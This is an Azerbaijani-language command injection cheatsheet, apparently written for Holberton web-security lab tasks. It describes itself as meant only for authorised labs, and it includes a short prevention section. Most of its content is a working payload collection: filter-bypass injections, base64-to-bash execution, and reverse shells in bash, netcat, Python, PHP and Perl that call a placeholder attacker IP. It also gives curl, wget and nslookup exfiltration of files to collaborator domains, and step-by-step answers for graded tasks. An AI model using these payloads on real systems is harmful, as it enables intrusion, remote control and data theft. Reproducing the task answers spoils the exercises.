# 💉 Command Injection — Tam Cheatsheet

> Yalnız icazəli lab/imtahan mühitləri üçün (Holberton Cyber-WebSec 0x09, Burp Academy, öz lab-ın).

---

## 📑 Məzmun

0. [Command Injection Nədir, Necə İşləyir](#0-command-injection-nədir-necə-işləyir)
1. [Injection Növləri](#1-injection-növləri)
2. [Təsiri & Risklər](#2-təsiri--risklər)
3. [Əsas Komanda Birləşdiriciləri (Command Separators)](#3-əsas-komanda-birləşdiriciləri-command-separators)
4. [Verbose (Görünən) Command Injection](#4-verbose-görünən-command-injection)
5. [Blind Command Injection](#5-blind-command-injection)
6. [Filter & WAF Bypass Texnikaları](#6-filter--waf-bypass-texnikaları)
   - 6.1 [Boşluq (Space) Bypass](#61-boşluq-space-bypass)
   - 6.2 [Blacklisted Sözlər Bypass](#62-blacklisted-sözlər-bypass)
   - 6.3 [Slash (`/`) Bypass](#63-slash--bypass)
   - 6.4 [Base64 ilə Tam Bypass](#64-base64-ilə-tam-bypass)
   - 6.5 [Environment Variable Bypass (HOME trick)](#65-environment-variable-bypass-home-trick--task-2)
7. [Reverse Shell Payload-ları](#7-reverse-shell-payload-ları)
8. [Out-of-Band (OOB) Exfiltration — Blind SSRF/CI üçün](#8-out-of-band-oob-exfiltration--blind-ci-üçün--task-3)
9. [nmap İnjection](#9-nmap-injection--task-4)
10. [Holberton Tapşırıqlarına Uyğun Strategiya](#10-holberton-tapşırıqlarına-uyğun-strategiya)
11. [Burp Suite ilə Praktiki İş Axını](#11-burp-suite-ilə-praktiki-iş-axını)
12. [Alətlər](#12-alətlər)
13. [Müdafiə / Prevention](#13-müdafiə--prevention)
14. [Quick Reference Payload Cədvəli](#14-quick-reference-payload-cədvəli)
15. [Faydalı Linklər](#15-faydalı-linklər)

---

## 0. Command Injection Nədir, Necə İşləyir

**Tərif:** İstifadəçi girişinin (input) düzgün sanasiya edilmədən birbaşa OS əmrinə (system call) ötürülməsi nəticəsində meydana gəlir. Attacker bu zəiflikdən istifadə edərək serverdə ixtiyari sistem əmrləri icra edə bilir.

**Real Dünya Nümunəsi (Log4Shell — CVE-2021-44228):**
2021-ci ildə Java-nın Log4j logging kitabxanasında aşkar olunan bu zəiflik, milyonlarla serverin idarəsini ələ almağa imkan verdi. Attacker sadəcə `${jndi:ldap://attacker.com/a}` kimi bir string göndərirdi — server bunu "log" edərkən JNDI lookup başladır, uzaq serverə qoşulur, kod yükləyib icra edir. **Bir sətir input = tam server kontrolu.**

```
Normal iş:
İstifadəçi: "8.8.8.8"  →  Server: ping 8.8.8.8  →  Nəticə: ping output

Hücum:
İstifadəçi: "8.8.8.8; id"  →  Server: ping 8.8.8.8; id  →  Nəticə: ping output + uid=33(www-data)
                                                                                        ↑
                                                                              BU ARTIQ RCE-DIR!
```

**Zəif kod nümunəsi (PHP):**
```php
// Zəif — input birbaşa shell_exec-ə gedir
$ip = $_GET['ip'];
$output = shell_exec("ping -c 4 " . $ip);
echo $output;

// Hücum: ?ip=8.8.8.8; cat /etc/passwd
// Əmr: ping -c 4 8.8.8.8; cat /etc/passwd
```

---

## 1. Injection Növləri

| Növ | İzahı | Necə Aşkarlanır |
|---|---|---|
| **Verbose / In-Band** | Əmrin nəticəsi birbaşa HTTP response-da görünür | `; id` → `uid=33(www-data)` response-da görünür |
| **Blind / Out-of-Band** | Nəticə response-da görünmür, amma əmr icra olunur | Time-based (`sleep`), DNS/HTTP callback |
| **Time-Based Blind** | Gecikməyə əsasən zəifliyin varlığını sübut edirik | `; sleep 5` → səhifə 5 san gec yüklənir |
| **Error-Based** | Müxtəlif əmrlərə fərqli error mesajları gəlir | Port scanning, boolean inference |

---

## 2. Təsiri & Risklər

- **Tam Server Kontrolu (RCE)** — istənilən əmr icra etmək
- **Məlumat oğurluğu** — `/etc/passwd`, konfiqurasiya faylları, database credentials
- **Reverse Shell** — interaktiv terminal bağlantısı
- **Lateral Movement** — daxili şəbəkəyə pivoting
- **Persistence** — crontab, SSH key əlavəsi ilə kalıcı giriş
- **DoS** — `rm -rf /`, disk doldurma
- **Privilege Escalation** — SUID binary-lər vasitəsilə root almaq

---

## 3. Əsas Komanda Birləşdiriciləri (Command Separators)

Bunlar iki əmri birləşdirən operatorlardır. Hər birinin davranışı fərqlidir — bunu bilmək filter bypass üçün vacibdir.

| Operator | OS | Davranış | Nümunə | İstifadə Halı |
|---|---|---|---|---|
| `;` | Linux | **Həmişə** ikinci əmri icra edir, birincinin nəticəsindən asılı deyil | `ping 8.8.8.8; id` | Ən universal, ən çox işlənən |
| `&&` | Linux/Win | Yalnız **birinci uğurlu** olduqda ikincini icra edir | `ping 8.8.8.8 && id` | Birinci əmr düzgün işləyəndə |
| `\|\|` | Linux/Win | Yalnız **birinci uğursuz** olduqda ikincini icra edir | `xyzERROR \|\| id` | Birinci əmr qəsdən yanlış yazılanda |
| `\|` (pipe) | Linux/Win | Birincinin **çıxışını** ikincinin **girişinə** ötürür | `id \| curl attacker.com` | Output exfiltration üçün |
| `&` | Linux/Win | Birincini arxa fonda icra edir, **dərhal** ikinciyə keçir | `ping 8.8.8.8 & id` | Background execution |
| `` ` ` `` (backtick) | Linux | Daxilindəki əmri icra edib nəticəni inline əvəzləyir | `` ping `whoami` `` | Nested command execution |
| `$(...)` | Linux | Backtick ilə eyni, amma daha oxunaqlı | `ping $(whoami)` | Nested command execution |
| `%0a` / `\n` | Linux | URL-encoded newline — filter-ı keçmək üçün | `8.8.8.8%0aid` | Boşluq/separator filter bypass |
| `%0d%0a` | Linux | Carriage return + newline (CRLF) | `8.8.8.8%0d%0aid` | HTTP header injection + CI |

> 🧠 **İmtahan üçün əzbərlə:** `;` həmişə işləyir. `||` isə birinci əmr yanlış olduqda. Əgər input `; ` bloklayırsa, `%0a` sına.

---

## 4. Verbose (Görünən) Command Injection

Nəticə birbaşa səhifədə görünür — ən rahat ssenari.

### İlk Yoxlama Payload-ları (Hər Zaman Bunu Sına)

```bash
# Əsas identifikasiya
; id
; whoami
; uname -a
; hostname
; pwd

# Birləşdirici test — hansının işlədiyini bil
8.8.8.8; id
8.8.8.8 && id
8.8.8.8 | id
8.8.8.8 || id
8.8.8.8%0aid

# Fayl oxumaq
; cat /etc/passwd
; cat /0-flag.txt
; cat /etc/1-flag.txt
; ls -la /
; ls -la /var/www/html

# Sistem məlumatı
; env               # Bütün environment variable-ları gör
; printenv          # Alternativ
; echo $HOME        # HOME variable-ı gör
; echo $PATH        # PATH-ı gör
```

### Task 0 üçün Birbaşa Həll

```
Target: http://web0x09.hbtn/app1/
Payload: google.com; cat /0-flag.txt

İzah: Filtrsiz endpoint — birbaşa semicolon ilə ikinci əmri əlavə et
```

---

## 5. Blind Command Injection

Nəticə response-da görünmür. Zəifliyin varlığını sübut etmək üçün iki üsul var.

### A. Time-Based (Gecikməyə Əsaslı)

```bash
# Linux — 5 saniyə gözlə
; sleep 5
&& sleep 5
%0asleep 5
| sleep 5

# Windows — 5 saniyə (ping vasitəsilə)
& ping -n 6 127.0.0.1

# Daha uzun gecikmə (şübhə yoxdursa)
; sleep 10
```

**Necə test edilir:**
```bash
# Öz terminalında vaxtı ölç
time curl -X POST "http://target/ping" -d "ip=8.8.8.8; sleep 5"
# Nəticə: real 5.12s → ZƏİFLİK TƏSDİQLƏNDİ
```

### B. Out-of-Band — Nəticəni Kənara Göndər

```bash
# HTTP vasitəsilə (curl)
; curl http://SENIN_IP:8080/$(whoami)
; curl http://SENIN_IP:8080/?data=$(cat /etc/passwd | base64)
; wget "http://SENIN_IP:8080/?cmd=$(id)"

# DNS vasitəsilə (nslookup — Task 3 üçün)
; nslookup $(cat /var/www/3-flag.txt).SENIN_COLLABORATOR.oastify.com
; nslookup $(whoami).abc123.oastify.com

# Burp Collaborator ilə interactsh
; curl http://abc123.oast.fun/test
```

**Öz serverini qur (Holberton lab maşınında):**
```bash
# Sadə HTTP server — incoming request-ləri gör
python3 -m http.server 8080

# Daha çox məlumat üçün
nc -lvnp 8080
```

---

## 6. Filter & WAF Bypass Texnikaları

> 🎯 Bu bölmə Task 1, 2, 3 üçün əsas — Holberton tapşırıqları məhz filter bypass-a həsr olunub.

### 6.1 Boşluq (Space) Bypass

Əgər server boşluq simvolunu (`' '`) bloklayırsa:

```bash
# $IFS — Internal Field Separator (Bash daxili dəyişəni, standart olaraq boşluq kimi işləyir)
cat$IFS/etc/passwd
cat${IFS}/etc/passwd
id;cat${IFS}/etc/1-flag.txt

# Tab simvolu (%09)
cat%09/etc/passwd
cat%09/etc/1-flag.txt

# Newline ilə ayır (%0a)
cat%0a/etc/passwd

# Brace expansion (boşluq olmadan)
{cat,/etc/passwd}
{id,}
{cat,/etc/1-flag.txt}

# Giriş yönləndirmə (redirection)
cat</etc/passwd
cat</etc/1-flag.txt

# $() ilə nested
$(cat /etc/passwd)
```

> 🧠 **Şəkildəki payloadlar (foto-dan):**
> ```bash
> cat${IFS}/etc/passwd    # IFS dəyişəni
> cat%09/etc/passwd       # Tab (%09)
> {cat,/etc/passwd}       # Brace expansion
> cat</etc/passwd         # Redirection
> ```

### 6.2 Blacklisted Sözlər Bypass

Əgər `cat`, `id`, `whoami`, `flag`, `passwd` kimi sözlər bloklanıbsa:

**Dırnaq (Quote) ilə parçalama:**
```bash
c""at /etc/passwd
c''at /etc/passwd
ca""t /etc/1-flag.txt
wh""oami
/usr/bin/i""d
```

**Backslash ilə parçalama:**
```bash
c\at /etc/passwd
c\a\t /etc/passwd
/usr/bin/i\d
```

**Wildcard-larla əvəzləmə:**
```bash
/bin/c?t /etc/passwd        # ? bir simvolu əvəzləyir
/bin/c?t /etc/1-f???.txt    # ? ilə flag-ı tap
/bin/cat /etc/p*sswd        # * sıfır və ya çox simvolu əvəzləyir
/usr/bin/wh?am?             # whoami
```

**Dəyişənlərlə birləşdirmə:**
```bash
A=ca;B=t;$A$B /etc/passwd
A=c;B=at;$A$B${IFS}/etc/passwd
X=fla;Y=g;cat /etc/${X}${Y}
```

**Alternativ əmrlər:**
```bash
# cat yerinə
more /etc/passwd
less /etc/passwd
head /etc/passwd
tail /etc/passwd
tac /etc/passwd       # tac = cat tərsinə
nl /etc/passwd        # nömrəli sətirlərlə çıxarır
od -c /etc/passwd     # octal dump
xxd /etc/passwd       # hex dump
strings /etc/passwd   # printable strings
```

### 6.3 Slash (`/`) Bypass

Əgər `/` (slash) bloklayıbsa — path-ı birbaşa yaza bilmirsənsə:

```bash
# $HOME environment variable-ı ilə (Task 2 üçün!)
# /root/ = $HOME (root istifadəçi üçün)
# /home/www-data/ = $HOME (www-data üçün)
echo $HOME            # HOME-un nə olduğunu gör

# PATH-dan istifadə
echo $PATH            # /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

# HOME ilə path qur — "/" olmadan
cat$IFS${HOME:0:1}etc${HOME:0:1}passwd
# ${HOME:0:1} = HOME-un ilk simvolu = "/"

# PWD-dən slash al
cat ${PWD:0:1}etc${PWD:0:1}passwd
# PWD = /var/www/html → ${PWD:0:1} = "/"

# PATH-dan slash al
echo ${PATH:0:1}       # "/"

# Brace expansion ilə
{cat,${HOME}/../../etc/passwd}
```

> 🎯 **Task 2 üçün xüsusi hint:** `The flag is in /var/2-flag.txt` — Path crafted with HOME bypasses filter.
> ```bash
> # HOME = /home/someuser və ya /root
> # /var/2-flag.txt yolunu HOME-la qur
> cat${IFS}${HOME:0:1}var${HOME:0:1}2-flag.txt
> ```

### 6.4 Base64 ilə Tam Bypass

Filtrlər çox sərt olduqda — bütün komandanı gizlət:

```bash
# Addım 1: Öz maşında əmri base64-ə çevir
echo "cat /etc/1-flag.txt" | base64
# Nəticə: Y2F0IC9ldGMvMS1mbGFnLnR4dAo=

echo "cat /var/2-flag.txt" | base64
# Nəticə: Y2F0IC92YXIvMi1mbGFnLnR4dAo=

echo "cat /var/www/3-flag.txt" | base64
# Nəticə: Y2F0IC92YXIvd3d3LzMtZmxhZy50eHQK

# Addım 2: Payload-u göndər
echo${IFS}Y2F0IC9ldGMvMS1mbGFnLnR4dAo=|base64${IFS}-d|bash
echo${IFS}Y2F0IC92YXIvMi1mbGFnLnR4dAo=|base64${IFS}-d|bash

# Boşluq filtri yoxdursa:
echo Y2F0IC9ldGMvcGFzc3dkCg== | base64 -d | bash

# $IFS versiyonu (space bloklanıbsa):
echo${IFS}Y2F0IC9ldGMvcGFzc3dkCg==|base64${IFS}-d|bash

# Alternative: eval ilə
eval$(echo${IFS}Y2F0IC9ldGMvcGFzc3dkCg==|base64${IFS}-d)
```

**Hex Encoding alternativ:**
```bash
# xxd ilə hex → bash
$(xxd -r -p <<< '636174202f6574632f706173737764')

# printf ilə
printf '\x63\x61\x74\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64' | bash
```

### 6.5 Environment Variable Bypass (HOME trick) — Task 2

```bash
# HOME nədir?
echo $HOME          # /root (root üçün) və ya /home/www-data (www-data üçün)
printenv HOME       # eyni

# HOME-un ilk simvolunu al (= "/")
echo ${HOME:0:1}    # çıxış: /
echo ${HOME::1}     # eyni

# PATH-dan slash al
echo ${PATH%%:*}    # ilk path elementi, məs /usr/local/sbin
echo ${PATH:0:1}    # "/"

# Slash-sız path qurma nümunəsi
# Hədəf: /var/2-flag.txt
cat${IFS}${HOME:0:1}var${HOME:0:1}2-flag.txt

# PWD-dən istifadə
# Əgər /var/www/html-dəsənsə: ${PWD:0:1} = "/"
cat${IFS}${PWD:0:1}var${PWD:0:1}2-flag.txt

# Daha sadə yol — cd ilə
cd /var && cat 2-flag.txt
# Space bloklanıbsa:
cd${IFS}${HOME:0:1}var&&cat${IFS}2-flag.txt
```

---

## 7. Reverse Shell Payload-ları

> ⚠️ Hücumdan əvvəl öz maşınında `nc -lvnp 4444` ilə portu dinlə!

### Bash

```bash
# Standart
bash -i >& /dev/tcp/SENIN_IP/4444 0>&1

# URL-encoded (HTTP parametrə göndərərkən)
bash+-i+>%26+/dev/tcp/SENIN_IP/4444+0>%261

# Base64-lü (filter bypass üçün)
# echo "bash -i >& /dev/tcp/SENIN_IP/4444 0>&1" | base64
bash -c {echo,BASE64_STRING}|{base64,-d}|bash

# Injection payload kimi:
; bash -i >& /dev/tcp/SENIN_IP/4444 0>&1
; bash${IFS}-i${IFS}>&${IFS}/dev/tcp/SENIN_IP/4444${IFS}0>&1
```

### Netcat (nc)

```bash
# -e parametri ilə (köhnə nc versiyalarında)
nc -e /bin/bash SENIN_IP 4444

# -e bloklanıbsa — MKFIFO metodu
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc SENIN_IP 4444 > /tmp/f

# nc.traditional (Debian/Ubuntu-da)
nc.traditional -e /bin/bash SENIN_IP 4444
```

### Python

```bash
python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("SENIN_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'

# Daha qısa
python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("SENIN_IP",4444));[os.dup2(s.fileno(),i) for i in range(3)];pty.spawn("/bin/bash")'
```

### PHP

```bash
php -r '$sock=fsockopen("SENIN_IP",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
```

### Perl

```bash
perl -e 'use Socket;$i="SENIN_IP";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");'
```

### Shell-i Stabilize Et (aldıqdan sonra)

```bash
# Terminal-ı tam interaktiv et
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
# Ctrl+Z → stty raw -echo; fg
```

---

## 8. Out-of-Band (OOB) Exfiltration — Blind CI Üçün — Task 3

Task 3-də nəticə göstərilmir — `nslookup` ilə flag məzmununu Burp Collaborator-a göndərməlisən.

### Burp Collaborator Qurulması

```
1. Burp Suite açın
2. Burp → Collaborator → "Copy to clipboard"
3. Unikal domain alırsınız: abc123.oastify.com
4. Bu domain-i payload-lara daxil edin
5. "Poll now" ilə incoming request-ləri izləyin
```

### interactsh (Burp Pro yoxdursa — PULSUZ)

```bash
# Docker ilə
docker run projectdiscovery/interactsh-client

# Ya da birbaşa
interactsh-client
# → unikal domain alırsınız: xyz.oast.fun
```

### nslookup ilə Data Exfiltration

```bash
# Əsas — flag məzmununu subdomain kimi göndər
; nslookup $(cat /var/www/3-flag.txt) abc123.oastify.com

# Base64 ilə (boşluq varsa daha güvənli)
; nslookup $(cat /var/www/3-flag.txt | base64) abc123.oastify.com

# IFS ilə (space bloklanıbsa)
;nslookup$(IFS)$(cat${IFS}/var/www/3-flag.txt)$(IFS)abc123.oastify.com

# Hissə-hissə göndər (məzmun uzundursa)
; nslookup $(cat /var/www/3-flag.txt | head -1) abc123.oastify.com

# whoami ilə test et əvvəlcə
; nslookup $(whoami).abc123.oastify.com

# hostname ilə test
; nslookup $(hostname).abc123.oastify.com
```

### curl ilə HTTP Exfiltration

```bash
# Fayl məzmununu HTTP GET parametrinə yıx
; curl http://SENIN_IP:8080/?data=$(cat /var/www/3-flag.txt | base64 -w 0)

# URL-safe base64
; curl http://SENIN_IP:8080/$(cat /var/www/3-flag.txt | base64 -w 0)

# POST ilə
; curl -X POST http://SENIN_IP:8080/ -d "flag=$(cat /var/www/3-flag.txt)"
```

### wget ilə

```bash
; wget http://SENIN_IP:8080/?data=$(cat /var/www/3-flag.txt | base64 -w 0)
```

### DNS Exfiltration Nüansları

```bash
# DNS label limiti 63 simvoldur — uzun məzmun üçün
# Flag-ı hissələrə böl:
; nslookup $(cat /var/www/3-flag.txt | cut -c1-30).abc123.oastify.com
; nslookup $(cat /var/www/3-flag.txt | cut -c31-60).abc123.oastify.com

# hex ilə
; nslookup $(cat /var/www/3-flag.txt | xxd -p | tr -d '\n' | cut -c1-60).abc123.oastify.com
```

---

## 9. nmap İnjection — Task 4

Task 4-də nmap inputu zəifdir. nmap parametrlərinə injection etmək üçün:

```bash
# nmap command-ı belə çağırılır (güman):
# nmap -p PORT IP
# Bizim input: "127.0.0.1:8080"

# nmap-ın özünün script engine-i ilə (NSE)
127.0.0.1; cat /bin/4-flag.txt
127.0.0.1 && cat /bin/4-flag.txt

# nmap-ın --script parametrini istifadə et
127.0.0.1 --script="+http-shellshock"

# OS command inject
127.0.0.1; id
127.0.0.1; ls /bin/
127.0.0.1; cat /bin/4-flag.txt

# Port parametrindən inject
127.0.0.1:8080; cat /bin/4-flag.txt
127.0.0.1 -p 80; cat /bin/4-flag.txt

# Newline ilə
127.0.0.1%0acat /bin/4-flag.txt
127.0.0.1%0acat${IFS}/bin/4-flag.txt
```

---

## 10. Holberton Tapşırıqlarına Uyğun Strategiya

| Task | Endpoint | Müdafiə | Bypass Texnikası | Flag Yeri |
|---|---|---|---|---|
| **0** | `/app1/` | Yoxdur | Birbaşa `; cat /0-flag.txt` | `/0-flag.txt` |
| **1** | `/app2/` | Space + command blacklist | `$IFS`, `%09`, `{cmd,}`, quote bypass | `/etc/1-flag.txt` |
| **2** | `/app3/` | Space + blacklist + slash | `${HOME:0:1}` ilə path qur, `$IFS` ilə space | `/var/2-flag.txt` |
| **3** | `/app4/` | Output göstərilmir (Blind) | `nslookup $(cat flag).collaborator` | `/var/www/3-flag.txt` |
| **4** | `/app5/` | nmap inputu | nmap parametrinə `;` inject et | `/bin/4-flag.txt` |

---

### Task 0 — Detallı Həll

```
URL: http://web0x09.hbtn/app1/
Input sahəsi: ping (google.com üçün)

Payload: google.com; cat /0-flag.txt

İzah: Heç bir filter yoxdur. Semicolon ikinci əmri başladır.
Alternativ: google.com && cat /0-flag.txt
```

---

### Task 1 — Detallı Həll

```
URL: http://web0x09.hbtn/app2/
Müdafiə: space bloklanıb, bəzi əmrlər bloklanıb

Addım 1: Boşluqsuz əmr sına
Payload 1: google.com;id
Payload 2: google.com;whoami

Addım 2: Flag-ı oxu — space yoxdur, $IFS istifadə et
Payload 3: google.com;cat${IFS}/etc/1-flag.txt
Payload 4: google.com;cat</etc/1-flag.txt
Payload 5: google.com;{cat,/etc/1-flag.txt}

Əgər "cat" bloklanıbsa:
Payload 6: google.com;more${IFS}/etc/1-flag.txt
Payload 7: google.com;head${IFS}/etc/1-flag.txt
```

---

### Task 2 — Detallı Həll

```
URL: http://web0x09.hbtn/app3/
Müdafiə: space + slash + çox komanda bloklanıb
Flag: /var/2-flag.txt

Addım 1: HOME variable-ı yoxla
Payload: google.com;echo${IFS}$HOME
→ /root və ya /home/www-data görünür

Addım 2: HOME-dan slash al
${HOME:0:1} = "/"

Addım 3: Flag-ı oxu
Payload: google.com;cat${IFS}${HOME:0:1}var${HOME:0:1}2-flag.txt

Alternativ yollar:
google.com;cat${IFS}${PWD:0:1}var${PWD:0:1}2-flag.txt
google.com;cat${IFS}${PATH:0:1}var${PATH:0:1}2-flag.txt

Əgər "cat" bloklanıbsa, wildcard sına:
google.com;/bin/c?t${IFS}${HOME:0:1}var${HOME:0:1}2-flag.txt
```

---

### Task 3 — Detallı Həll

```
URL: http://web0x09.hbtn/app4/
Müdafiə: Blind — output yoxdur
Flag: /var/www/3-flag.txt
Üsul: nslookup + Burp Collaborator/interactsh

Addım 1: Collaborator domain al
→ abc123.oastify.com

Addım 2: Əvvəlcə test et
Payload: google.com; nslookup abc123.oastify.com
→ Collaborator-da request gəlirmi? Gəlirsə ZƏİFLİK TƏSDİQLƏNDİ

Addım 3: Flag-ı exfiltrate et
Payload: google.com; nslookup $(cat /var/www/3-flag.txt) abc123.oastify.com

Boşluq problemi varsa:
Payload: google.com;nslookup$(IFS)$(cat${IFS}/var/www/3-flag.txt)$(IFS)abc123.oastify.com

Addım 4: Collaborator-da gələn DNS sorğusunu izlə
→ subdomain = flag məzmunu
```

---

### Task 4 — Detallı Həll

```
URL: http://web0x09.hbtn/app5/
Input: nmap üçün (127.0.0.1:8080 nümunəsi)
Flag: /bin/4-flag.txt

Payload 1 (sadə): 127.0.0.1; cat /bin/4-flag.txt
Payload 2: 127.0.0.1 && cat /bin/4-flag.txt
Payload 3 (newline): 127.0.0.1%0acat /bin/4-flag.txt
Payload 4 (space yoxdursa): 127.0.0.1;cat${IFS}/bin/4-flag.txt
```

---

## 11. Burp Suite ilə Praktiki İş Axını

### Addım 1: İlk Manual Test

```
1. Tətbiqi aç, form-u tap (ping input)
2. "google.com" yaz → normal nəticəni gör
3. Burp Proxy açıq olsun, sorğunu Repeater-ə göndər (Ctrl+R)
```

### Addım 2: Injection Nöqtəsini Müəyyən Et

```
Repeater-də parametri dəyiş:
ip=google.com → ip=google.com; id

Server cavabında "uid=..." görünsə → Verbose CI təsdiqləndi
Cavab dəyişməsə → Blind CI sına (sleep)
```

### Addım 3: Filter Analizi

```
Sırayla sına:
1. ip=; id                          (separator test)
2. ip=google.com; id                (semi-colon)
3. ip=google.com && id              (and-and)
4. ip=google.com | id               (pipe)
5. ip=google.com%0aid               (newline)

Error mesajını oxu:
"Special characters not allowed" → separator bloklanıb, başqasını sına
"Command not allowed" → "id" bloklanıb, bypass sına
"Space not allowed" → space bypass sına ($IFS, %09, <)
```

### Addım 4: Payload Kəşfiyyatı

```
# Sistem məlumatı topla
; uname -a
; env
; echo $HOME
; echo $PATH
; ls /
; ls /etc/
; ls /var/
; ls /bin/

# Flag-ı tap
; find / -name "*flag*" 2>/dev/null
; find / -name "*.txt" 2>/dev/null | head -20
```

### Addım 5: Commix ilə Avtomatik Test

```bash
# Burp-dan tutulmuş sorğu faylı saxla (request.txt kimi)
# Sonra commix ilə yoxla:
commix --request=request.txt --batch

# Manual URL ilə
commix --url="http://web0x09.hbtn/app1/ping" --data="ip=INJECT_HERE" --batch

# GET parametri ilə
commix --url="http://web0x09.hbtn/app1/?ip=INJECT_HERE" --batch
```

---

## 12. Alətlər

| Alət | Məqsəd | Quraşdırma |
|---|---|---|
| **Burp Suite** | Proxy, Repeater, Collaborator | `apt install burpsuite` |
| **Commix** | Automated CI fuzzing & exploitation | `apt install commix` |
| **interactsh** | OOB/Blind CI aşkarlama (Collaborator alternativ) | `docker run projectdiscovery/interactsh-client` |
| **curl** | HTTP sorğu, data exfiltration | Preinstalled |
| **nc (netcat)** | Reverse shell dinlə | `apt install netcat-openbsd` |
| **python3** | HTTP server, reverse shell | Preinstalled |

```bash
# Commix nümunəsi
commix --url="http://target.com/ping?ip=INJECT_HERE" --batch
commix --request=burp_request.txt --batch

# interactsh Docker
docker run -it projectdiscovery/interactsh-client:latest

# Reverse shell dinlə
nc -lvnp 4444

# Sadə HTTP server (OOB üçün)
python3 -m http.server 8080
```

---

## 13. Müdafiə / Prevention

> Nəzəri sual gələ bilər — əzbərlə

1. **Heç vaxt user input-u birbaşa shell əmrinə verməyin** — bu, əsas qayda.

2. **Parametrli funksiyalar istifadə et** — `shell_exec()` yox, `escapeshellarg()` ilə:
   ```php
   // Zəif
   $out = shell_exec("ping " . $_GET['ip']);
   
   // Güvənli
   $ip = escapeshellarg($_GET['ip']);
   $out = shell_exec("ping -c 4 " . $ip);
   ```

3. **Allowlist (Whitelist) Validasiyası** — yalnız icazəli format-ları qəbul et:
   ```php
   if (!preg_match('/^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$/', $ip)) {
       die("Invalid IP");
   }
   ```

4. **Shell-siz alternativlər istifadə et** — Python-da `subprocess.run(['ping', ip], shell=False)`.

5. **Minimum imtiyaz prinsipi** — web server prosesi root ilə işləməməlidir.

6. **WAF (Web Application Firewall)** — payload-ları filtrləyir, amma bypass mümkündür.

7. **Input uzunluğu məhdudiyyəti** — uzun payload-ların qarşısını alır.

8. **Çıxış sanitizasiyası** — nəticəni də encode et (error-based CI-nin qarşısını alır).

---

## 14. Quick Reference Payload Cədvəli

```bash
# ===== BASIC INJECTION =====
; id
; whoami
; cat /FLAG_FILE
google.com; id
google.com && id
google.com | id
google.com || id
google.com%0aid

# ===== SPACE BYPASS =====
cat$IFS/etc/passwd
cat${IFS}/etc/1-flag.txt
cat</etc/passwd
{cat,/etc/passwd}
cat%09/etc/passwd

# ===== SLASH BYPASS (HOME trick) =====
cat${IFS}${HOME:0:1}var${HOME:0:1}2-flag.txt
cat${IFS}${PWD:0:1}etc${PWD:0:1}passwd
cat${IFS}${PATH:0:1}bin${PATH:0:1}4-flag.txt

# ===== COMMAND BYPASS =====
c""at /etc/passwd          # quote trick
c\at /etc/passwd           # backslash trick
/bin/c?t /etc/passwd       # wildcard
/bin/c?t /var/2-flag.txt

# ===== BASE64 BYPASS =====
echo${IFS}BASE64_HERE|base64${IFS}-d|bash
# echo "cat /etc/1-flag.txt" | base64 → Y2F0IC9ldGMvMS1mbGFnLnR4dAo=
echo${IFS}Y2F0IC9ldGMvMS1mbGFnLnR4dAo=|base64${IFS}-d|bash

# ===== BLIND — TIME BASED =====
; sleep 5
; sleep 10
&& sleep 5
%0asleep 5

# ===== BLIND — OOB (nslookup) =====
; nslookup $(whoami).COLLABORATOR_DOMAIN
; nslookup $(cat /var/www/3-flag.txt) COLLABORATOR_DOMAIN
;nslookup$(IFS)$(cat${IFS}/var/www/3-flag.txt)$(IFS)COLLABORATOR_DOMAIN

# ===== BLIND — OOB (curl) =====
; curl http://SENIN_IP:8080/$(whoami)
; curl http://SENIN_IP:8080/?data=$(cat /var/www/3-flag.txt | base64 -w 0)

# ===== REVERSE SHELL =====
; bash -i >& /dev/tcp/SENIN_IP/4444 0>&1
; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc SENIN_IP 4444 >/tmp/f

# ===== NMAP INJECTION =====
127.0.0.1; cat /bin/4-flag.txt
127.0.0.1%0acat /bin/4-flag.txt
127.0.0.1;cat${IFS}/bin/4-flag.txt

# ===== ENUMERATION =====
; ls /
; ls /etc/ | grep flag
; find / -name "*flag*" 2>/dev/null
; env
; echo $HOME
; echo $PATH
; echo ${HOME:0:1}
```

---

## 15. Faydalı Linklər

| Mənbə | URL |
|---|---|
| **PortSwigger — OS Command Injection** | https://portswigger.net/web-security/os-command-injection |
| **PortSwigger Labs** | https://portswigger.net/web-security/os-command-injection#lab-links |
| **HackTricks — Command Injection** | https://book.hacktricks.xyz/pentesting-web/command-injection |
| **PayloadsAllTheThings — CI** | https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection |
| **OWASP — Command Injection** | https://owasp.org/www-community/attacks/Command_Injection |
| **Revshells.com** | https://www.revshells.com/ |
| **Commix (GitHub)** | https://github.com/commixproject/commix |
| **interactsh (GitHub)** | https://github.com/projectdiscovery/interactsh |
| **Bash IFS Explained** | https://www.gnu.org/software/bash/manual/html_node/Word-Splitting.html |
| **TryHackMe — Command Injection Room** | https://tryhackme.com/room/oscommandinjection |

---
